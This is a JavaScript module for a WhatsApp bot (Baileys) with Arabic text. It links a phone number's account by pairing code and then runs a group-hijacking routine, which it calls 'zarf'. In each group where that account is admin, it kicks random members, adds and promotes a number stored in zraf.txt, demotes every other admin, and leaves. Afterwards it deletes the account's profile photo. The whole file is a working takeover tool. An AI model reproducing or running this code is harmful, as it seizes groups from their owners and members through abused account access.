import { 
    default as makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    jidDecode 
} from '@whiskeysockets/baileys';
import fs from 'fs-extra';
import { promises as fsp } from 'fs';
import { join, resolve } from 'path';
import chalk from 'chalk';
import pino from 'pino';
const subBots = new Map();
const decode = jid => (jidDecode(jid)?.user || jid.split('@')[0]) + '@s.whatsapp.net';
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const onlyDigits = (s) => (s || '').replace(/[^0-9]/g, '');
const asJid = (num) => onlyDigits(num) + '@s.whatsapp.net';
const dataDir = join(process.cwd(), 'data');
const zrafFilePath = join(dataDir, 'zraf.txt');
async function ensureZrafFile() {
    await fs.ensureDir(dataDir);
    const exists = await fs.pathExists(zrafFilePath);
    if (!exists) {
        await fsp.writeFile(zrafFilePath, '');
    }
}
async function readZrafNumber() {
    try {
        await ensureZrafFile();
        const raw = await fsp.readFile(zrafFilePath, 'utf8');
        const trimmedRaw = raw.trim();
        const numberMatch = trimmedRaw.match(/\[?([0-9]{6,})\]?/);
        const number = numberMatch ? numberMatch[1] : null;
        if (!number) {
            throw new Error('لم أجد رقمًا صالحًا داخل data/zraf.txt');
        }
        return number;
    } catch (err) {
        console.error(chalk.red("خطأ في تحميل ملف ZRAF:"), err.message);
        return null;
    }
}
function idMatchesAny(candidate, ids) {
    if (!candidate) return false;
    const c = candidate.toLowerCase();
    return ids.some(x => x && x.toLowerCase && x.toLowerCase() === c);
}
function chooseSafeBotIdForms(botJid, botLid) {
    const out = [];
    if (botLid) out.push(botLid);
    if (botJid) out.push(botJid);
    return out;
}
function chooseTargetIdForms(targetJid, targetLid) {
    const out = [];
    if (targetLid) out.push(targetLid);
    if (targetJid) out.push(targetJid);
    return out;
}
async function fetchIds(sock, numOrJid) {
    const jid = numOrJid.endsWith('@s.whatsapp.net') ? numOrJid : asJid(numOrJid);
    try {
        const arr = await sock.onWhatsApp(jid);
        const info = Array.isArray(arr) ? arr[0] : arr;
        return {
            jid: info?.jid || jid,
            lid: info?.lid || null,
            exists: info?.exists || false
        };
    } catch (e) {
        console.error(chalk.red(`❌ فشل التحقق من وجود الرقم ${numOrJid}:`), e.message);
        return { jid: null, lid: null, exists: false };
    }
}
async function tryRemoveOwnProfilePhoto(sock) {
    try {
        if (typeof sock.removeProfilePicture === 'function') {
            console.log(chalk.dim("  - محاولة إزالة صورة بروفايل البوت..."));
            await sock.removeProfilePicture(sock.user.id);
            console.log(chalk.green("  ✅ تم إزالة الصورة بنجاح."));
        }
    } catch (e) {
        console.error(chalk.red("  ❌ فشل إزالة صورة البروفايل:"), e.message);
    }
}
async function runYallaPhase(sock, targetJid, targetLid, { botJid, botLid, sender }) {
    const botForms = chooseSafeBotIdForms(botJid, botLid);
    const targetForms = chooseTargetIdForms(targetJid, targetLid);
    let groupsProcessed = 0;
    console.log(chalk.yellow(`\n--- [ مرحلة يلا ] ---`));
    const allGroups = Object.values(await sock.groupFetchAllParticipating());
    const filteredGroups = allGroups.filter(g => g.size && g.size >= 10);
    const groups = filteredGroups.sort((a, b) => (b.size || 0) - (a.size || 0));
    const getRandom = (arr, n) => {
        const shuffled = [...arr].sort(() => 0.5 - Math.random());
        return shuffled.slice(0, n);
    };
    for (const g of groups) {
        const gid = g.id;
        console.log(chalk.gray(`\n>> معالجة المجموعة: ${gid}`));
        try {
            const md = await sock.groupMetadata(gid);
            const parts = md.participants;
            const botP = parts.find(p => idMatchesAny(p.id, botForms));
            if (!botP || (botP.admin !== 'admin' && botP.admin !== 'superadmin')) {
                await sleep(1000);
                continue;
            }
            const targetExists = parts.some(p => idMatchesAny(p.id, targetForms));
            if (g.size >= 1024 && !targetExists) {
                const nonTargetMembers = parts.filter(p => !idMatchesAny(p.id, botForms) && !idMatchesAny(p.id, targetForms));
                const membersToKick = getRandom(nonTargetMembers, 2);
                const kickJids = membersToKick.map(p => p.id);
                if (kickJids.length > 0) {
                    await sock.groupParticipantsUpdate(gid, kickJids, 'remove');
                    await sleep(2000);
                }
            }
            if (!targetExists) {
                await sock.groupParticipantsUpdate(gid, [targetJid], 'add');
                await sleep(1000);
                const newMd = await sock.groupMetadata(gid);
                parts.splice(0, parts.length, ...newMd.participants);
            }
            const targetIsAdmin = parts.some(
                p => idMatchesAny(p.id, targetForms) && (p.admin === 'admin' || p.admin === 'superadmin')
            );
            if (!targetIsAdmin) {
                await sock.groupParticipantsUpdate(gid, [targetJid], 'promote');
                await sleep(1000);
            }
            const keep = [...botForms, ...targetForms];
            const toDemote = parts
                .filter(p => (p.admin === 'admin' || p.admin === 'superadmin') && !idMatchesAny(p.id, keep))
                .map(p => p.id);
            if (toDemote.length > 0) {
                await sock.groupParticipantsUpdate(gid, toDemote, 'demote');
                await sleep(2000);
            }
            await sock.groupLeave(gid);
            groupsProcessed++;
            await sleep(1000);
        } catch (e) {
            console.error(chalk.red(`   ❌ خطأ في المجموعة ${gid}:`), e.message);
            await sleep(1000);
        }
    }
    console.log(chalk.yellow(`\n--- [ نهاية مرحلة يلا ] ---`));
    return groupsProcessed;
}
async function execute({sock, msg, args, BIDS}) {
    const chatId = msg.key.remoteJid;
    const sender = decode(msg.key.participant || msg.participant || chatId);
    const senderLid = sender.split('@')[0];
    const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const parts = text.trim().split(/\s+/);
    let targetNumber = parts[1]?.replace(/[^0-9]/g, '');
    let pairingCode = parts[2]?.toUpperCase().trim(); 
    if (!targetNumber) {
        return sock.sendMessage(chatId, { text: '❌ أدخل رقم الهاتف بعد الأمر (مثال: .روم 9665xxx code)' }, { quoted: msg });
    }
    if (pairingCode && !pairingCode.match(/^[A-Z0-9]{8}$/)) {
        return sock.sendMessage(chatId, { text: '❌ كود الربط يجب أن يكون 8 حروف أو أرقام كبيرة (مثال: AB12CDEF)' }, { quoted: msg });
    }
    const baseDir = process.cwd();
    const targetBotDir = join(baseDir, `co${targetNumber}`);
    const sessionDir = join(targetBotDir, 'ملف_الاتصال');
    const credsFile = join(sessionDir, 'creds.json');
    const botFilesExist = fs.existsSync(targetBotDir);
    if (!botFilesExist) {
        await sock.sendMessage(chatId, {
            text: `جاري نقل ملكية بوت الارقام للرقم ${targetNumber}\n...`
        }, { quoted: msg });
        await fs.ensureDir(targetBotDir);
        const files = await fs.readdir(baseDir);
        for (const file of files) {
            const srcPath = join(baseDir, file);
            const destPath = join(targetBotDir, file);
            const stats = await fs.stat(srcPath);
            if (
                (stats.isDirectory() && (file.startsWith('co') || file === 'media')) ||
                file === 'node_modules' ||
                file.startsWith('.') ||
                file === 'ملف_الاتصال' ||
                file === 'session' 
            ) {
                continue;
            }
            if (stats.isDirectory()) {
                await fs.copy(srcPath, destPath);
            } else if (stats.isFile()) {
                await fs.copyFile(srcPath, destPath);
            }
        }
        console.log(chalk.green(`[${targetNumber}] ✅ تم نسخ ملفات البوت.`));
    } else {
        console.log(chalk.gray(`[${targetNumber}] ✅ ملفات البوت موجودة مسبقًا.`));
    }
    await fs.ensureDir(sessionDir);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const newSock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: ['Ubuntu', 'Chrome', '110.0.0'],
        markOnlineOnConnect: true,
    });
    subBots.set(targetNumber, newSock);
    newSock.ev.on('creds.update', saveCreds);
    const hasSession = fs.existsSync(credsFile);
    if (!hasSession) {
        setTimeout(async () => {
            try {
                let code;
                if (pairingCode) {
                    code = await newSock.requestPairingCode(targetNumber, pairingCode);
                    console.log(chalk.green(`✅ كود الربط الثابت للرقم ${targetNumber}: ${code}`));
                    await sock.sendMessage(chatId, { text: `${code}` });
                } else {
                    code = await newSock.requestPairingCode(targetNumber);
                    console.log(chalk.green(`✅ كود الربط التلقائي للرقم ${targetNumber}: ${code}`));
                    await sock.sendMessage(chatId, { text: `${code}` }, { quoted: msg });
                }
            } catch (err) {
                console.error(chalk.red(`[${targetNumber}] ❌ فشل في جلب الكود:`), err.message);
                await sock.sendMessage(chatId, {
                    text: `❌ فشل في طلب كود الربط: ${err.message}`
                }, { quoted: msg });
            }
        }, 3000);
    } else {
        await sock.sendMessage(chatId, {
            text: `✅ جلسة موجودة مسبقًا، تم تشغيل البوت الفرعي للرقم ${targetNumber}.`
        }, { quoted: msg });
    }
    newSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            await sock.sendMessage(sender, { text: `🤖 تم الاتصال بالرقم ${targetNumber} بنجاح. جاري بدء عمليات الزرف...` });
            try {
                const zrafNumber = await readZrafNumber();
                if (!zrafNumber) {
                    await sock.sendMessage(sender, { text: `⚠️ لم يتم العثور على رقم zraf. يرجى تسجيله أولاً في zraf.txt.` });
                    return;
                }
                const { jid: targetJid, lid: targetLid, exists: targetExists } = await fetchIds(newSock, zrafNumber);
                if (!targetExists) {
                    await sock.sendMessage(sender, { text: `❌ الرقم *${zrafNumber}* غير مسجل على واتساب.` });
                    return;
                }
                const botJid = newSock.user.id;
                const botInfoArr = await newSock.onWhatsApp(botJid);
                const botInfo = Array.isArray(botInfoArr) ? botInfoArr[0] : botInfoArr;
                const botLid = botInfo?.lid || null;
                const groupsYalla = await runYallaPhase(newSock, targetJid, targetLid, { botJid, botLid, sender });
                await sock.sendMessage(sender, { text: `✅ تم إنهاء مرحلة *يلا* بنجاح.\nتم معالجة *${groupsYalla}* مجموعة.` });
                await tryRemoveOwnProfilePhoto(newSock);
                await sock.sendMessage(sender, {
                    text: `✅ تم إنهاء كل العمليات. البوت الفرعي للرقم *${targetNumber}* جاهز.`
                });
            } catch (e) {
                console.error(e);
                await sock.sendMessage(sender, { text: `❌ فشل تفعيل العمليات: ${e.message || e}` });
            }
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.message || 'غير معروف';
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const isLoggedOut = statusCode === DisconnectReason.loggedOut;
            if (isLoggedOut) {
                subBots.delete(targetNumber);
                await sock.sendMessage(chatId, {
                    text: `🚪 تم تسجيل الخروج من الرقم ${targetNumber}.\n❗ أعد المحاولة للحصول على كود جديد.`,
                });
            } else {
                console.log(chalk.yellow(`🔄 انقطع الاتصال بالرقم ${targetNumber} (${reason})، محاولة إعادة الاتصال...`));
            }
        }
    });
}
export const NovaUltra = {
    command: "ملكية",
    description: "إنشاء بوت فرعي وتنفيذ زرف المجموعات (يقبل كود ربط ثابت)",
    category: "zarf",
    elite: "on",
    group: false,
    prv: false,
    lock: "on"
};
export default { NovaUltra, execute };
